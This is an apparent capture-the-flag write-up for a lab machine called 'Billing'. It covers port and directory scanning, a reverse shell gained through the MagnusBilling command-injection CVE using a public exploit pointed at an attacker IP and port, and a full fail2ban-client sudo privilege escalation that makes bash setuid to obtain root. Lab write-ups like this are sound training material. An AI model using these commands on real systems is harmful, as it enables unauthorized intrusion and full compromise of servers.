# Billing



## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 10.10.15.120 -oN port_scan.txt -Pn 

Nmap scan report for 10.10.15.120
Host is up (0.035s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumeration

### Dir/file enum

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.15.120/mbilling/ -w /usr/share/wordlists/SecLists_custom/raft-large-directories.txt -b 403,404

/tmp                  (Status: 301) [Size: 319] [--> http://10.10.15.120/mbilling/tmp/]
/lib                  (Status: 301) [Size: 319] [--> http://10.10.15.120/mbilling/lib/]
/assets               (Status: 301) [Size: 322] [--> http://10.10.15.120/mbilling/assets/]
/archive              (Status: 301) [Size: 323] [--> http://10.10.15.120/mbilling/archive/]
resources                        (Status: 301) [Size: 325] [--> http://10.10.15.120/mbilling/resources/]
/fpdf                 (Status: 301) [Size: 320] [--> http://10.10.15.120/mbilling/fpdf/]

```
{% endcode %}

{% code title="Versioning list" overflow="wrap" %}
```bash
gobuster dir -u http://10.10.140.114/mbilling/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/versioning_metafiles.txt -b 403,404

/README.md            (Status: 200) [Size: 1995]
```
{% endcode %}

In the README.md we can found the major version of the software.

<figure><img src="../../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>



### CVE-2023-30258 - mbilling Command Injection

Searching with searchsploit we can found a interesting thing

```bash
searchsploit MagnusBilling

MagnusSolution magnusbilling 7.3.0 - Command Injection  multiple/webapps/52170.txt
```

A possible version is affected to a Command Injection vulnerability.

Searching online i have found a repository with a python exploit that exploit this vulnerability making a requesto to the `/mbilling/lib/icepay/icepay.php` with a RevShell payload in the `democ` parameter.

```bash
git clone https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit

python3 exploit.py -t 10.10.140.114 -a 10.23.52.142 -p 9009
```

We obtained a rev shell!

<figure><img src="../../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

Now we can found user's flag in the follow path:

```bash
cat /home/magnus/user.txt
```



## Privilege Escalation

Enumeration with linpeas.sh

```bash
sudo -l 

User asterisk may run the following commands on ip-10-10-140-114:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

With the sudo rights on the fail2ban-client we have the possibility to Escalate out privilege to a root shell.

{% embed url="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/" %}

{% code overflow="wrap" %}
```bash
# Get jail list
sudo /usr/bin/fail2ban-client status

# Choose one of the jails from the previous list
sudo /usr/bin/fail2ban-client get asterisk-iptables actions

# Create a new action with arbitrary name
sudo /usr/bin/fail2ban-client set asterisk-iptables addaction sksk

# Set payload to actionban
sudo /usr/bin/fail2ban-client set asterisk-iptables action sksk actionban "chmod +s /bin/bash"

# Trigger the action
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.4.2

# Spawn a shell as root
/bin/bash -p
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

Print the last root flag

```bash
cat /root/root.txt
```
